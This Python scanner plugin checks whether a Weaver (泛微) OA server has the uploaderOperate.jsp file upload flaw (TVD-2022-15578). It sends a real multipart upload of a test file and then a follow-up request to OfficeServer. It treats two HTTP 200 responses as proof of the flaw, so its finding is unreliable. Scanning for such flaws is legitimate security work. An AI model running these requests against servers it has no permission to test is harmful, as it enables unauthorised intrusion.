import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging




def 泛微OA_uploader_OPerate(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"macOS"',
        "Upgrade-Insecure-Requests": '1',
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "close"

    }
    exp_url = urldata + "workrelate/plan/util/uploaderOperate.jsp"
    vuln_url = urldata + 'OfficeServer'
    data = '''------WebKitFormBoundarymVk33liI64J7GQaK
    Content-Disposition: form-data; name="secId"
    1
    ------WebKitFormBoundarymVk33liI64J7GQaK
    Content-Disposition: form-data; name="Filedata"; filename="testlog.txt"
    Test
    ------WebKitFormBoundarymVk33liI64J7GQaK
    Content-Disposition: form-data; name="plandetailid"
    1
    ------WebKitFormBoundarymVk33liI64J7GQaK'''
    exp = '''Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
    Content-Length: 207
    ------WebKitFormBoundarymVk33liI64J7GQaK
    Content-Disposition: form-data; name="aaa"
    {'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'20462'}
    ------WebKitFormBoundarymVk33liI64J7GQaK'''
    try:
        response1 = requests.post(exp_url, headers=headers, data=data, verify=False)
        response2 = requests.post(vuln_url, headers=headers, data=exp, verify=False)
        if response1.status_code == 200 and response2.status_code == 200:
            print(Vcolors.RED + "[+] 泛微 OA uploaderOperate.jsp 文件上传漏洞存在 #2022\r" + Vcolors.ENDC)
            print(Vcolors.RED + "[+] 详细https://tvd.wuthreat.com/#/listDetail?TVDID=TVD-2022-15578\r" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING +"[x] 不存在泛微 OA uploaderOperate.jsp 文件上传漏洞\r" + Vcolors.ENDC)
    except Exception as e:
        logging.error("泛微OA_uploader_OPerate脚本出现异常")
  
        


